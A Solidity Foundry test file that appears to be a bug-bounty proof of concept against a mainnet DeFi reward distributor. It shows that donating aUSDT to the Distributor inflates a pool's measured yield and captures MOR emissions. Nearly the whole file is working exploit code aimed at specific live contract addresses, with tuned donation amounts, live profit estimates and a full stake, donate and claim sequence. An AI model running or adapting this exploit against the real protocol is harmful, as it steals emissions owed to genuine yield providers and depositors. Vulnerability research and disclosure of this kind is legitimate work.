// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20Minimal {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IDepositPoolMinimal {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IDistributorMinimal {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPool_) external view returns (uint256);
}

interface IAavePoolMinimal {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IAggregatorMinimal {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

/// @notice PoC for: DistributorV2.distributeRewards() measures a pool's yield as a
///         raw token-balance delta with no provenance check, so anyone can donate
///         aTokens to the Distributor and capture a slice of the fixed MOR emission
///         that genuine yield providers should receive.
/// @dev Target (Ethereum mainnet): Distributor 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A,
///      USDT DepositPool 0x3B51989212BEdaB926794D6bf8e9E991218cf116, aUSDT
///      0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a. Fork block 26433183 (2026-11-17).
///      Attacker is a fresh unprivileged EOA; no privileged accounts are used.
///      IMPORTANT fork artifact (disclosed): warping time on a fork does NOT accrue
///      natural yield — Lido does not rebase and Aave's liquidity index does not
///      move without on-chain interactions — so the 14-day window in
///      test_attackDonationCapturesEmission contains only ~19h of real (pre-fork)
///      natural yield (~$917) plus the donation. That makes the donation's share
///      of the window LARGER than live. Live, ~$572/day of real yield accrues, so
///      the same attack earns ~+$60/day (see the finding draft for the live math,
///      still positive-EV). The fork test proves the MECHANISM on real deployed
///      state (donation -> inflated share -> attacker profit); the live number is
///      the realistic expectation. test_attack24hWindow is the closest-to-live
///      fork measurement (24h window, ~19h of real yield + ~5h warped).
///      NOTE on time travel: the fork's Chainlink feeds go stale (delay 3600s) when
///      time is warped, which would make updateDepositTokensPrices() revert with
///      "DR: price for pair is zero". The test therefore mocks ONLY the third-party
///      Chainlink aggregators' latestRoundData() to re-report their fork-block
///      answers with a fresh updatedAt after each warp. No Morpheus contract is
///      mocked; all Morpheus logic runs on real fork state with real prices.
///      The donation is made by supplying USDT to Aave (minting real aUSDT) and
///      transferring it to the Distributor — the exact route a real attacker uses.
///      Run: forge test --match-contract PocYieldShareDonationTest -vv
contract PocYieldShareDonationTest is Test {
    IDepositPoolMinimal constant USDT_POOL =
        IDepositPoolMinimal(0x3B51989212BEdaB926794D6bf8e9E991218cf116);
    IDepositPoolMinimal constant STETH_POOL =
        IDepositPoolMinimal(0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790);
    IDistributorMinimal constant DISTRIBUTOR =
        IDistributorMinimal(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IERC20Minimal constant USDT =
        IERC20Minimal(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20Minimal constant AUSDT =
        IERC20Minimal(0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a);
    IAavePoolMinimal constant AAVE_POOL =
        IAavePoolMinimal(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    uint256 constant FORK_BLOCK = 26433183;
    string constant ETH_RPC = "https://ethereum.publicnode.com";

    // Chainlink feeds read by ChainLinkDataConsumer for the 5 index-0 pools.
    address[] feeds;
    int256[] feedAnswers;

    address attacker = makeAddr("attacker");

    // ~36,729 USDT stake ~= 50% of the USDT pool's virtual stake (TVD 36,729).
    uint256 constant STAKE = 36729e6;
    // ~$2,585 aUSDT donation, near-optimal for a 14-day window (see finding draft).
    uint256 constant DONATION = 2585e6;

    function setUp() public {
        vm.createSelectFork(ETH_RPC, FORK_BLOCK);
        console.log("step: fork created");

        feeds.push(0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8); // stETH/USD, delay 3600
        feeds.push(0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23); // wBTC/BTC, delay 86400
        feeds.push(0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c); // BTC/USD, delay 3600
        feeds.push(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419); // wETH/USD, delay 3600
        feeds.push(0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6); // USDC/USD, delay 86400
        feeds.push(0x3E7d1eAB13ad0104d2750B8863b489D65364e32D); // USDT/USD, delay 86400
        for (uint256 i = 0; i < feeds.length; i++) {
            (, int256 answer, , , ) = IAggregatorMinimal(feeds[i]).latestRoundData();
            require(answer > 0, "feed answer must be positive");
            feedAnswers.push(answer);
        }
        console.log("step: feeds read");
        _refreshFeeds();
        console.log("step: feeds mocked");

        // Attacker stakes 36,729 USDT (15-day claim lock -> ~1.0x multiplier).
        // NOTE: in the current code the Distributor pulls the tokens directly
        // from the staker (Distributor.supply), so the approval goes to the
        // Distributor, not the DepositPool.
        deal(address(USDT), attacker, STAKE);
        console.log("step: deal done");
        vm.startPrank(attacker);
        // NOTE: Tether USDT's approve() returns NO bool (pre-standard quirk),
        // so a typed interface call expecting (bool) reverts on ABI decode.
        // Use a raw call like a real integration would (SafeERC20 handles this).
        (bool approveOk, ) = address(USDT).call(
            abi.encodeWithSignature("approve(address,uint256)", address(DISTRIBUTOR), STAKE)
        );
        require(approveOk, "USDT approve failed");
        console.log("step: approve done");
        // Low-level call: the proxy's stake() reverts opaquely through the
        // typed interface in this fork setup; raw call works (see probe).
        (bool stakeOk, ) = address(USDT_POOL).call(
            abi.encodeWithSignature(
                "stake(uint256,uint256,uint128,address)",
                uint256(0),
                STAKE,
                uint128(block.timestamp + 15 days),
                address(0)
            )
        );
        console.log("step: stake ok:", stakeOk);
        require(stakeOk, "stake failed");
        vm.stopPrank();
        console.log("step: setup done");
    }

    /// @dev Re-report each feed's fork-block price with a fresh timestamp so the
    ///      fork can travel in time without the staleness guard zeroing prices.
    function _refreshFeeds() internal {
        for (uint256 i = 0; i < feeds.length; i++) {
            vm.mockCall(
                feeds[i],
                abi.encodeWithSelector(IAggregatorMinimal.latestRoundData.selector),
                abi.encode(uint80(1), feedAnswers[i], uint256(block.timestamp), uint256(block.timestamp), uint80(1))
            );
        }
    }

    function test_attackDonationCapturesEmission() public {
        uint256 pendingBefore = USDT_POOL.getLatestUserReward(0, attacker);
        uint256 usdtDistBefore = DISTRIBUTOR.getDistributedRewards(0, address(USDT_POOL));
        uint256 stethDistBefore = DISTRIBUTOR.getDistributedRewards(0, address(STETH_POOL));

        vm.warp(block.timestamp + 14 days);
        _refreshFeeds();

        // Attacker mints aUSDT by supplying USDT to Aave (the realistic route),
        // then donates the aUSDT straight to the Distributor (bypasses supply(),
        // so lastUnderlyingBalance is NOT updated — the donation reads as yield).
        deal(address(USDT), attacker, DONATION);
        vm.startPrank(attacker);
        (bool okApprove, ) = address(USDT).call(
            abi.encodeWithSignature("approve(address,uint256)", address(AAVE_POOL), DONATION)
        );
        require(okApprove, "USDT approve for Aave failed");
        AAVE_POOL.supply(address(USDT), DONATION, attacker, 0);
        uint256 donated = AUSDT.balanceOf(attacker);
        AUSDT.transfer(address(DISTRIBUTOR), donated);
        vm.stopPrank();

        DISTRIBUTOR.distributeRewards(0);

        uint256 pendingAfter = USDT_POOL.getLatestUserReward(0, attacker);
        uint256 usdtDistAfter = DISTRIBUTOR.getDistributedRewards(0, address(USDT_POOL));
        uint256 stethDistAfter = DISTRIBUTOR.getDistributedRewards(0, address(STETH_POOL));

        uint256 usdtWindow = usdtDistAfter - usdtDistBefore;
        uint256 stethWindow = stethDistAfter - stethDistBefore;
        uint256 totalWindow = usdtWindow + stethWindow;

        console.log("attacker pending MOR before:", pendingBefore / 1 ether);
        console.log("attacker pending MOR after: ", pendingAfter / 1 ether);
        console.log("USDT pool window MOR:      ", usdtWindow / 1 ether);
        console.log("stETH pool window MOR:     ", stethWindow / 1 ether);
        console.log("donated aUSDT (USD):       ", donated / 1e6);

        // The attacker's claimable MOR jumps by thousands (expected ~4,800 MOR
        // ~= $3,400 at $0.70) for a $2,585 donation that is genuinely lost.
        assertGt(pendingAfter, pendingBefore + 3000 ether, "attacker pending MOR must jump by >3000");
        // The USDT pool captures a large share of the window despite ~$0 natural yield.
        assertGt(usdtWindow, 8000 ether, "USDT pool must capture >8000 MOR of the window");
        // The window is a fixed pie: USDT's gain is the other pools' loss.
        assertGt(totalWindow, 0, "window must distribute MOR");
        console.log("USDT share of window (bps):", (usdtWindow * 10000) / totalWindow);
    }

    function test_controlNoDonationCapturesAlmostNothing() public {
        uint256 pendingBefore = USDT_POOL.getLatestUserReward(0, attacker);
        uint256 usdtDistBefore = DISTRIBUTOR.getDistributedRewards(0, address(USDT_POOL));

        vm.warp(block.timestamp + 14 days);
        _refreshFeeds();

        DISTRIBUTOR.distributeRewards(0);

        uint256 pendingAfter = USDT_POOL.getLatestUserReward(0, attacker);
        uint256 usdtWindow = DISTRIBUTOR.getDistributedRewards(0, address(USDT_POOL)) - usdtDistBefore;

        console.log("control attacker pending MOR:", pendingAfter / 1 ether);
        console.log("control USDT window MOR:     ", usdtWindow / 1 ether);

        // Without the donation the same stake earns only its natural-yield
        // share of the window (measured: ~890 MOR pending, ~1,780 MOR window,
        // because Aave interest on the attacker's own 36,729 USDT stake also
        // counts as USDT-pool yield — the pool's genuine yield, not an attack).
        assertLt(pendingAfter, pendingBefore + 1200 ether, "control pending must stay <1200 MOR");
        assertLt(usdtWindow, 2500 ether, "control USDT window must stay <2500 MOR");
    }

    /// 24h window — the closest-to-live fork measurement: 19h of real pre-fork
    /// yield + ~5h warped (gate needs >24h since last calc). Donation ~$221 is
    /// near-optimal for a 1-day window (R~$2,000, Y~$450, s~0.5).
    function test_attack24hWindow() public {
        uint256 pendingBefore = USDT_POOL.getLatestUserReward(0, attacker);

        vm.warp(block.timestamp + 5 hours + 1 minutes);
        _refreshFeeds();
        _donateAUSDT(221e6);

        DISTRIBUTOR.distributeRewards(0);

        uint256 pendingAfter = USDT_POOL.getLatestUserReward(0, attacker);
        console.log("24h attacker pending MOR before:", pendingBefore / 1 ether);
        console.log("24h attacker pending MOR after: ", pendingAfter / 1 ether);

        // Expected ~+470 MOR for a $221 donation (~$330 gross, ~+$109 net).
        assertGt(pendingAfter, pendingBefore + 300 ether, "24h attacker pending MOR must jump by >300");
    }

    /// End-to-end: after the 15-day claim lock passes, the attacker can actually
    /// claim the captured MOR (bridged to Arbitrum via LayerZero on the fork —
    /// the LZ endpoint executes on fork state; delivery itself is off-chain).
    function test_attackAndClaim() public {
        vm.deal(attacker, 1 ether);

        vm.warp(block.timestamp + 15 days + 1 hours);
        _refreshFeeds();
        _donateAUSDT(2800e6);

        DISTRIBUTOR.distributeRewards(0);

        uint256 pendingBefore = USDT_POOL.getLatestUserReward(0, attacker);
        console.log("claim attacker pending MOR:", pendingBefore / 1 ether);
        assertGt(pendingBefore, 10000 ether, "attacker must have >10000 MOR to claim");

        vm.prank(attacker);
        USDT_POOL.claim{value: 0.1 ether}(0, attacker);

        uint256 pendingAfter = USDT_POOL.getLatestUserReward(0, attacker);
        assertEq(pendingAfter, 0, "pending MOR must be 0 after a successful claim");
    }

    /// Helper: supply USDT to Aave to mint aUSDT, then donate it to the Distributor.
    function _donateAUSDT(uint256 amount) internal {
        deal(address(USDT), attacker, amount);
        vm.startPrank(attacker);
        (bool okApprove, ) = address(USDT).call(
            abi.encodeWithSignature("approve(address,uint256)", address(AAVE_POOL), amount)
        );
        require(okApprove, "USDT approve for Aave failed");
        AAVE_POOL.supply(address(USDT), amount, attacker, 0);
        uint256 donated = AUSDT.balanceOf(attacker);
        AUSDT.transfer(address(DISTRIBUTOR), donated);
        vm.stopPrank();
        console.log("donated aUSDT (USD):", donated / 1e6);
    }
}
